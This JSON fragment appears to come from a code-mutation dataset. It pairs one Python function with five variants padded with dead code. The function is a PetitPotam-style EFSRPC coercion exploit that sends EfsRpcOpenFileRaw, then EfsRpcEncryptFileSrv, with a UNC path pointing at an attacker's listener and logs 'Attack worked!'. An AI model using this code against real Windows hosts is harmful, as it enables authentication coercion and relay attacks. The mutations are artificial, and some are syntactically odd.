        "original": "def efs_rpc_open_file_raw(dce, listener, context=None):\n    try:\n        request = EfsRpcOpenFileRaw()\n        request['fileName'] = '\\\\\\\\%s\\\\test\\\\Settings.ini\\x00' % listener\n        request['Flag'] = 0\n        resp = dce.request(request)\n    except Exception as e:\n        if str(e).find('ERROR_BAD_NETPATH') >= 0:\n            context.log.info('[+] Got expected ERROR_BAD_NETPATH exception!!')\n            context.log.info('[+] Attack worked!')\n            return True\n        if str(e).find('rpc_s_access_denied') >= 0:\n            context.log.info('[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!')\n            context.log.info('[+] OK! Using unpatched function!')\n            context.log.info('[-] Sending EfsRpcEncryptFileSrv!')\n            try:\n                request = EfsRpcEncryptFileSrv()\n                request['FileName'] = '\\\\\\\\%s\\\\test\\\\Settings.ini\\x00' % listener\n                resp = dce.request(request)\n            except Exception as e:\n                if str(e).find('ERROR_BAD_NETPATH') >= 0:\n                    context.log.info('[+] Got expected ERROR_BAD_NETPATH exception!!')\n                    context.log.info('[+] Attack worked!')\n                    return True\n                else:\n                    context.log.debug('Something went wrong, check error status => %s' % str(e))\n        else:\n            context.log.debug('Something went wrong, check error status => %s' % str(e))",
        "mutated": [
            "def efs_rpc_open_file_raw(dce, listener, context=None):\n    if False:\n        i = 10\n    try:\n        request = EfsRpcOpenFileRaw()\n        request['fileName'] = '\\\\\\\\%s\\\\test\\\\Settings.ini\\x00' % listener\n        request['Flag'] = 0\n        resp = dce.request(request)\n    except Exception as e:\n        if str(e).find('ERROR_BAD_NETPATH') >= 0:\n            context.log.info('[+] Got expected ERROR_BAD_NETPATH exception!!')\n            context.log.info('[+] Attack worked!')\n            return True\n        if str(e).find('rpc_s_access_denied') >= 0:\n            context.log.info('[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!')\n            context.log.info('[+] OK! Using unpatched function!')\n            context.log.info('[-] Sending EfsRpcEncryptFileSrv!')\n            try:\n                request = EfsRpcEncryptFileSrv()\n                request['FileName'] = '\\\\\\\\%s\\\\test\\\\Settings.ini\\x00' % listener\n                resp = dce.request(request)\n            except Exception as e:\n                if str(e).find('ERROR_BAD_NETPATH') >= 0:\n                    context.log.info('[+] Got expected ERROR_BAD_NETPATH exception!!')\n                    context.log.info('[+] Attack worked!')\n                    return True\n                else:\n                    context.log.debug('Something went wrong, check error status => %s' % str(e))\n        else:\n            context.log.debug('Something went wrong, check error status => %s' % str(e))",
            "def efs_rpc_open_file_raw(dce, listener, context=None):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    try:\n        request = EfsRpcOpenFileRaw()\n        request['fileName'] = '\\\\\\\\%s\\\\test\\\\Settings.ini\\x00' % listener\n        request['Flag'] = 0\n        resp = dce.request(request)\n    except Exception as e:\n        if str(e).find('ERROR_BAD_NETPATH') >= 0:\n            context.log.info('[+] Got expected ERROR_BAD_NETPATH exception!!')\n            context.log.info('[+] Attack worked!')\n            return True\n        if str(e).find('rpc_s_access_denied') >= 0:\n            context.log.info('[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!')\n            context.log.info('[+] OK! Using unpatched function!')\n            context.log.info('[-] Sending EfsRpcEncryptFileSrv!')\n            try:\n                request = EfsRpcEncryptFileSrv()\n                request['FileName'] = '\\\\\\\\%s\\\\test\\\\Settings.ini\\x00' % listener\n                resp = dce.request(request)\n            except Exception as e:\n                if str(e).find('ERROR_BAD_NETPATH') >= 0:\n                    context.log.info('[+] Got expected ERROR_BAD_NETPATH exception!!')\n                    context.log.info('[+] Attack worked!')\n                    return True\n                else:\n                    context.log.debug('Something went wrong, check error status => %s' % str(e))\n        else:\n            context.log.debug('Something went wrong, check error status => %s' % str(e))",
            "def efs_rpc_open_file_raw(dce, listener, context=None):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    try:\n        request = EfsRpcOpenFileRaw()\n        request['fileName'] = '\\\\\\\\%s\\\\test\\\\Settings.ini\\x00' % listener\n        request['Flag'] = 0\n        resp = dce.request(request)\n    except Exception as e:\n        if str(e).find('ERROR_BAD_NETPATH') >= 0:\n            context.log.info('[+] Got expected ERROR_BAD_NETPATH exception!!')\n            context.log.info('[+] Attack worked!')\n            return True\n        if str(e).find('rpc_s_access_denied') >= 0:\n            context.log.info('[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!')\n            context.log.info('[+] OK! Using unpatched function!')\n            context.log.info('[-] Sending EfsRpcEncryptFileSrv!')\n            try:\n                request = EfsRpcEncryptFileSrv()\n                request['FileName'] = '\\\\\\\\%s\\\\test\\\\Settings.ini\\x00' % listener\n                resp = dce.request(request)\n            except Exception as e:\n                if str(e).find('ERROR_BAD_NETPATH') >= 0:\n                    context.log.info('[+] Got expected ERROR_BAD_NETPATH exception!!')\n                    context.log.info('[+] Attack worked!')\n                    return True\n                else:\n                    context.log.debug('Something went wrong, check error status => %s' % str(e))\n        else:\n            context.log.debug('Something went wrong, check error status => %s' % str(e))",
            "def efs_rpc_open_file_raw(dce, listener, context=None):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    try:\n        request = EfsRpcOpenFileRaw()\n        request['fileName'] = '\\\\\\\\%s\\\\test\\\\Settings.ini\\x00' % listener\n        request['Flag'] = 0\n        resp = dce.request(request)\n    except Exception as e:\n        if str(e).find('ERROR_BAD_NETPATH') >= 0:\n            context.log.info('[+] Got expected ERROR_BAD_NETPATH exception!!')\n            context.log.info('[+] Attack worked!')\n            return True\n        if str(e).find('rpc_s_access_denied') >= 0:\n            context.log.info('[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!')\n            context.log.info('[+] OK! Using unpatched function!')\n            context.log.info('[-] Sending EfsRpcEncryptFileSrv!')\n            try:\n                request = EfsRpcEncryptFileSrv()\n                request['FileName'] = '\\\\\\\\%s\\\\test\\\\Settings.ini\\x00' % listener\n                resp = dce.request(request)\n            except Exception as e:\n                if str(e).find('ERROR_BAD_NETPATH') >= 0:\n                    context.log.info('[+] Got expected ERROR_BAD_NETPATH exception!!')\n                    context.log.info('[+] Attack worked!')\n                    return True\n                else:\n                    context.log.debug('Something went wrong, check error status => %s' % str(e))\n        else:\n            context.log.debug('Something went wrong, check error status => %s' % str(e))",
            "def efs_rpc_open_file_raw(dce, listener, context=None):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    try:\n        request = EfsRpcOpenFileRaw()\n        request['fileName'] = '\\\\\\\\%s\\\\test\\\\Settings.ini\\x00' % listener\n        request['Flag'] = 0\n        resp = dce.request(request)\n    except Exception as e:\n        if str(e).find('ERROR_BAD_NETPATH') >= 0:\n            context.log.info('[+] Got expected ERROR_BAD_NETPATH exception!!')\n            context.log.info('[+] Attack worked!')\n            return True\n        if str(e).find('rpc_s_access_denied') >= 0:\n            context.log.info('[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!')\n            context.log.info('[+] OK! Using unpatched function!')\n            context.log.info('[-] Sending EfsRpcEncryptFileSrv!')\n            try:\n                request = EfsRpcEncryptFileSrv()\n                request['FileName'] = '\\\\\\\\%s\\\\test\\\\Settings.ini\\x00' % listener\n                resp = dce.request(request)\n            except Exception as e:\n                if str(e).find('ERROR_BAD_NETPATH') >= 0:\n                    context.log.info('[+] Got expected ERROR_BAD_NETPATH exception!!')\n                    context.log.info('[+] Attack worked!')\n                    return True\n                else:\n                    context.log.debug('Something went wrong, check error status => %s' % str(e))\n        else:\n            context.log.debug('Something went wrong, check error status => %s' % str(e))"
        ]
    }
]